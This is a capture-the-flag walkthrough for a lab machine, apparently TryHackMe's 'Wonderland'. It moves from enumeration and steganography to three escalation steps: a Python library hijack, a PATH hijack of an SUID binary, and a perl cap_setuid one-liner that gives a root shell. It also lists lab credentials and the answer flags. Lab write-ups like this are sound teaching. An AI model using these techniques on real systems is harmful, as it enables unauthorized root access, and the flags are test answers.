# Wonderland - Medium

```shell
rustscan -a 10.10.126.181 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.126.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 50

exiftool white_rabbit_1.jpg

steghide info white_rabbit_1.jpg
#contains hint.txt

steghide extract -sf white_rabbit_1.jpg
#read hint.txt

#login to ssh
ssh alice@10.10.126.181

ls -la

sudo -l
#we can run a Python program as rabbit

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

vim random.py
#python library hijacking
#so that the library executes /bin/bash

cat random.py

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
#this gives us shell as rabbit

whoami
#rabbit

cd /home/rabbit

cat teaParty
#read through the strings

export PATH=/tmp:$PATH

echo $PATH
#/tmp is first
#so we can create a program in /tmp that invokes shell

cd /tmp

vim date
#create program that starts /bin/bash

chmod +x /tmp/date

cat /tmp/date

cd /home/rabbit

./teaParty
#we are hatter now

whoami
#hatter

cd /home/hatter

ls -la

cat password.txt

#in another tab, we can ssh as hatter
ssh hatter@10.10.126.181

sudo -l
#we cannot run commands as sudo

#for privesc, we can run linpeas.sh
#get linpeas.sh from attacker machine, make it executable
./linpeas.sh

#for perl with capabilities set
#check exploit from GTFObins
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

#root shell
cat /root/user.txt

cat /home/alice/root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Golang http server

We can check the website for clues; it has an image file of a rabbit and a clue - "Follow the White Rabbit".

We can explore the website and try stego techniques on the image files, while enumerating with the help of Gobuster in the background

We can download the image and check using stego tools.

steghide works without passphrase for this image and we extract hint.txt - it says 'follow the r a b b i t'

This clue can be intercepted as letters for nested directories, that is, visiting /r, followed by /r/a, followed by /r/a/b, and so on; so we can do that

Meanwhile, from the /img directory, we can download other image files and check if they have any clues using stego.

On visiting /r/a/b/b/i/t, we get a webpage, through which alice is entering Wonderland.
In the source code for the same webpage, we get a clue:

    alice:HowDothTheLittleCrocodileImproveHisShiningTail

This could be used as credentials for SSH login; and we succeed.

We could not find user.txt in our home directory, so we will have to find other ways for privesc.

Checking for commands that we can run as sudo, we can see that a Python program can be run as rabbit by alice.

We run the program as alice once, and we can see that it just prints random lines from a poem.

Checking the code, we can see that in the first line, it uses 'import random'; we can try Python library hijacking here.

We can create a file called random.py to call /bin/bash:

    import os
    os.system("/bin/bash")

Now, we just need to execute the Python script as rabbit user; now we are 'rabbit'.

We have a binary 'teaParty' in our home directory; reading its contents, we can see that it uses 'date'; it is not called with an absolute path.

Furthermore, this program has SUID bit set, so we can exploit $PATH.

After adding /tmp to $PATH, we can create a program named date in /tmp, so that it is called first when we run teaParty:

    #!/bin/bash
    /bin/bash

Now, after making the date program executable, we can run the teaParty binary; this gives us shell as 'hatter'.

In hatter's home directory, we get password.txt, which includes the credential "WhyIsARavenLikeAWritingDesk?"; we don't know yet who is it for though.

We can start another ssh session, and try this password for hatter; it works.

Now, for privesc, we can run linpeas.sh and check for any ways to get root.

linpeas.sh shows that /usr/bin/perl has capabilities set (cap_setuid+ep); we can check exploit from GTFObins.

The exploit works and we get shell as root.

User flag can be found at /root/user.txt and root flag can be found at /home/alice/root.txt
```

1. Obtain the flag in user.txt - thm{"Curiouser and curiouser!"}

2. Escalate your privileges, what is the flag in root.txt? - thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
